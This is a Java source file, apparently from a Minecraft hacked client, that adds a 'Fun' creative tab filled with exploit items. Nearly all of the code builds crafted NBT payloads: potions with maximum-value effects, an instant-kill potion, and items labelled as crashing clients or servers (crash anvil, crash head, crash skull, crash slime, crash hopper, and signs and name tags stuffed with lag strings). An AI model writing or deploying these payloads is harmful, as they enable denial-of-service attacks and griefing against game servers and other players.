package Method.Client.utils.Creativetabs;

import com.mojang.authlib.GameProfile;
import com.mojang.authlib.properties.Property;
import java.util.ArrayList;
import net.minecraft.block.Block;
import net.minecraft.client.Minecraft;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.enchantment.Enchantment;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.inventory.EntityEquipmentSlot;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTException;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTUtil;
import net.minecraft.util.NonNullList;

public class CreativeTabFun extends CreativeTabs {
  ItemStack Blankspot = new ItemStack(Items.BRICK);
  
  ArrayList<Enchantment> Enchants;
  
  ArrayList<Integer> Levels;
  
  public CreativeTabFun() {
    super("Fun");
    this.Enchants = new ArrayList<>();
    this.Levels = new ArrayList<>();
  }
  
  public String getTabLabel() {
    return "Fun";
  }
  
  public void displayAllRelevantItems(NonNullList<ItemStack> itemList) {
    this.Blankspot.setCount(-1);
    try {
      Creativetabhelper.Attributeitems(Items.NETHERBRICK, this.Enchants, this.Levels, itemList, EntityEquipmentSlot.HEAD, false);
      Creativetabhelper.Attributeitems(Items.NETHERBRICK, this.Enchants, this.Levels, itemList, EntityEquipmentSlot.OFFHAND, false);
      ItemStack trollPotion = new ItemStack((Item)Items.SPLASH_POTION);
      trollPotion.setItemDamage(16395);
      NBTTagList trollPotionEffects = new NBTTagList();
      for (int i = 1; i <= 27; i++) {
        NBTTagCompound nBTTagCompound = new NBTTagCompound();
        nBTTagCompound.setInteger("Amplifier", 2147483647);
        nBTTagCompound.setInteger("Duration", 2147483647);
        nBTTagCompound.setInteger("Id", i);
        trollPotionEffects.appendTag((NBTBase)nBTTagCompound);
      } 
      trollPotion.setTagInfo("CustomPotionEffects", (NBTBase)trollPotionEffects);
      trollPotion.setStackDisplayName("Â§cÂ§lTrollÂ§6Â§lPotion");
      itemList.add(trollPotion);
      ItemStack killPotion = new ItemStack((Item)Items.SPLASH_POTION);
      killPotion.setItemDamage(16395);
      NBTTagCompound effect = new NBTTagCompound();
      effect.setInteger("Amplifier", 125);
      effect.setInteger("Duration", 1);
      effect.setInteger("Id", 6);
      NBTTagList effects = new NBTTagList();
      effects.appendTag((NBTBase)effect);
      killPotion.setTagInfo("CustomPotionEffects", (NBTBase)effects);
      killPotion.setStackDisplayName("Â§cÂ§lKillÂ§6Â§lPotion");
      itemList.add(killPotion);
      ItemStack crashAnvil = new ItemStack(Blocks.ANVIL);
      crashAnvil.setStackDisplayName("Â§8CrashÂ§cÂ§lAnvil Â§7| Â§cmc1.8-mc1.8");
      crashAnvil.setItemDamage(16384);
      itemList.add(crashAnvil);
      ItemStack crashHead = new ItemStack(Items.SKULL);
      NBTTagCompound compound = new NBTTagCompound();
      compound.setString("SkullOwner", " ");
      crashHead.setTagCompound(compound);
      crashHead.setStackDisplayName("Â§8CrashÂ§6Â§lHead Â§7| Â§cmc1.8-mc1.10");
      itemList.add(crashHead);
      ItemStack Armorstand = new ItemStack((Item)Items.ARMOR_STAND);
      Armorstand.setTagCompound(JsonToNBT.getTagFromJson("{EntityTag:{Equipment:[{},{},{},{},{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:\"Test\"}}]}}"));
      itemList.add(Armorstand);
      ItemStack Armorstand2 = new ItemStack((Item)Items.ARMOR_STAND);
      Armorstand2.setStackDisplayName("Â§cÂ§lArmor stand++");
      Armorstand2.setTagCompound(JsonToNBT.getTagFromJson("{EntityTag:{NoBasePlate:1,ShowArms:1}}"));
      itemList.add(Armorstand2);
      ItemStack InstaCreeper = new ItemStack(Items.SPAWN_EGG);
      InstaCreeper.setStackDisplayName("Â§cÂ§lInsta Creeper");
      InstaCreeper.setTagCompound(JsonToNBT.getTagFromJson("{EntityTag:{Fuse:-1,id:\"minecraft:creeper\",ignited:1,ExplosionRadius:127}}"));
      itemList.add(InstaCreeper);
      ItemStack CrashSlime = new ItemStack(Items.SPAWN_EGG);
      CrashSlime.setStackDisplayName("Â§cÂ§lCrash Slime");
      CrashSlime.setTagCompound(JsonToNBT.getTagFromJson("{EntityTag:{Size:32767,id:\"minecraft:slime\"}}"));
      itemList.add(CrashSlime);
      ItemStack Firework = new ItemStack(Items.FIREWORKS);
      Firework.setStackDisplayName("Â§cÂ§lLong Firework");
      Firework.setTagCompound(JsonToNBT.getTagFromJson("{Fireworks:{Flight:127,Explosions:[{Type:0,Trail:1b,Colors:[I;16711680],FadeColors:[I;16711680]}]}}"));
      itemList.add(Firework);
      ItemStack Fwork = new ItemStack(Items.FIREWORKS);
      Fwork.setTagCompound(JsonToNBT.getTagFromJson("{Fireworks:{Flight:3}}"));
      itemList.add(Fwork);
      ItemStack CrashSkull = new ItemStack(Item.getItemById(397), 1, 3);
      NBTTagCompound nbt = new NBTTagCompound();
      NBTTagCompound c = new NBTTagCompound();
      GameProfile prof = new GameProfile(null, "name");
      prof.getProperties().put("textures", new Property("Value", "eyJ0ZXh0­dXJlcyI6eyJTS0lOIjp7InVybCI6IiJ9fX0="));
      c.setString("Id", "9d744c33-f3c4-4040-a7fc-73b47c840f0c");
      NBTUtil.writeGameProfile(c, prof);
      nbt.setTag("SkullOwner", (NBTBase)c);
      nbt.setBoolean("crash", true);
      CrashSkull.stackTagCompound = nbt;
      CrashSkull.setStackDisplayName("Hold me :D");
      itemList.add(CrashSkull);
      ItemStack Head = new ItemStack(Item.getItemById(397), 1, 3);
      Head.setTagInfo("SkullOwner", (NBTBase)new NBTTagString((Minecraft.getMinecraft()).player.getName()));
      itemList.add(Head);
      ItemStack Crashhopper = new ItemStack((Block)Blocks.HOPPER);
      Crashhopper.setStackDisplayName("Â§cÂ§lCrash hopper");
      Crashhopper.setTagCompound(JsonToNBT.getTagFromJson("{BlockEntityTag:{Items:[{Slot:0,id:\"skull\",Count:64,tag:{SkullOwner:{Id:\"0\"}}}]}}"));
      itemList.add(Crashhopper);
      ItemStack Potion = new ItemStack((Item)Items.SPLASH_POTION);
      Potion.setTagCompound(JsonToNBT.getTagFromJson("{CustomPotionEffects:[{Duration:20,Id:6,Amplifier:253}]}"));
      itemList.add(Potion);
      ItemStack Linger = new ItemStack((Item)Items.LINGERING_POTION);
      Linger.setTagCompound(JsonToNBT.getTagFromJson("{CustomPotionEffects:[{Radius:100,Duration:20,Id:6,Amplifier:253}],HideFlags:32}"));
      itemList.add(Linger);
      StringBuilder lagStringBuilder = new StringBuilder();
      for (int j = 0; j < 500; j++)
        lagStringBuilder.append("/(!Â§()%/Â§)=/(!Â§()%/Â§)=/(!Â§()%/Â§)="); 
      ItemStack sign = new ItemStack(Items.SIGN);
      sign.setStackDisplayName("Â§cÂ§lCrash sign");
      sign.setTagCompound(JsonToNBT.getTagFromJson("{BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\",Text2:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\",Text3:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\",Text4:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\"}}"));
      itemList.add(sign);
      ItemStack spawn = new ItemStack(Items.NAME_TAG);
      spawn.setTagCompound(JsonToNBT.getTagFromJson("{display:{Name: \"" + lagStringBuilder.toString() + "\"}}"));
      itemList.add(spawn);
    } catch (NBTException e) {
      e.printStackTrace();
    } 
    super.displayAllRelevantItems(itemList);
  }
  
  public ItemStack createIcon() {
    return new ItemStack(Items.TNT_MINECART);
  }
}
